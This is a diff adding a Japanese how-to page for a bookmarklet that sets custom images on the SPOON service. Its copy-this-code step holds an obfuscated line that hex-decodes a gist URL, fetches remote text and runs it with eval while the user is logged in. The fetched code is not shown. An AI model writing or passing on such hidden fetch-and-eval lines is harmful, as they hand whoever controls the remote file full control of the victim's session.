@@ -1,0 +1,74 @@
+<!-- <!DOCTYPE html>
+  <html lang="ja">
+  <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>アイコン動かしたいよ</title>
+  </head>
+  <body>
+      
+      <textarea readonly="readonly" style="resize: none;">(async()=>{let d=e=>new TextDecoder().decode(new Uint8Array(e.match(/.{1,2}/g).map(e=>parseInt(e,16)))),res=await fetch(d("68747470733a2f2f676973742e67697468756275736572636f6e74656e742e636f6d2f6e6175676874792d6a756e2f30386662363637623534373039626161363939326465393462376135346237622f7261772f73706f6f6e2d696d6167652d736574746572")),text=await res.text();eval(d(text))})();</textarea>
+      <button>コピー</button>
+  </body>
+  </html> -->
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPOONの画像を好きに設定したいんじゃ</title>
+    <link rel="stylesheet" href="./simple.min.css">
+  </head>
+  <body>
+    <div>
+      <h1>SPOONの画像を好きに設定したいんじゃ v1.0</h1>
+
+      <h2>お願い</h2>
+      <div>まずは<i style="text-decoration: underline;">これを知ってる人</i>に連絡してね😊</div>
+      <div>許可されている人だけが使えるように、一応制限をしてるため</div>
+      <div>制限は回避できるけど、それができる人はコレを使うまでもないスキルがあるはず</div>
+
+      <h2>使い方</h2>
+      
+      <h3>1. 下のコードをコピーする</h3>
+      <p id="contentToCopy" class="notice">
+        (async()=>{let d=e=>new TextDecoder().decode(new Uint8Array(e.match(/.{1,2}/g).map(e=>parseInt(e,16)))),res=await fetch(d("68747470733a2f2f676973742e67697468756275736572636f6e74656e742e636f6d2f6e6175676874792d6a756e2f30386662363637623534373039626161363939326465393462376135346237622f7261772f73706f6f6e2d696d6167652d736574746572")),text=await res.text();eval(d(text))})();
+      </p>
+      <button id="copyBtn">コピー</button>
+      
+      <h3>2. 適当なページでブックマークを作成＆編集 (このページでブックマーク作成してもOK)</h3>
+      <table>
+        <tr>
+          <td>名前</td>
+          <td>なんでもいいけど呼び出しやすい簡単な名前を推奨 (xxxxx とか)</td>
+        </tr>
+        <tr>
+          <td>URL</td>
+          <td>javascript: コード</td>
+        </tr>
+      </table>
+      <img src="./01.jpg" style="width: 50%;">
+      
+      <h3>3. SPOONを開いてログインする</h3>
+      <h5>※SPOONのアプリではなくブックマークを作成したブラウザで</h5>
+      
+      <h3>4. アドレスバーに作成したブックマークの名前を入力してブックマークを呼び出す</h3>
+      <img src="./02.png" style="width: 50%;">
+      <img src="./03.png" style="width: 50%;">
+      <h5>※SPOONのページを開いた状態で呼び出すこと</h5>
+      <h5>※ブックマーク一覧から選択して呼び出すのはNG (PCなら動くけど、最近のスマホのブラウザだとブックマーク一覧から選択して動くのはあまりない)</h5>
+      
+      <h3>5. ダイアログが表示されるので好きな画像を選択して登録！</h3>
+      <img src="./04.jpg" style="width: 50%;">
+      <img src="./05.png" style="width: 50%;">
+      
+      <h3>エラーが表示されなければ完了！おつかれ様！</h3>
+
+      <h3></h3>
+
+    </div>
+    <script>
+      document.addEventListener("DOMContentLoaded",(()=>{const t=document.getElementById("copyBtn"),e=document.getElementById("contentToCopy");t.addEventListener("click",(async()=>{const t=e.innerText.trim();try{await navigator.clipboard.writeText(t),alert("コピーした ✅")}catch(t){console.log(t),alert("コピー失敗 ⚠️")}}))}));
+    </script>
+  </body>
+</html>
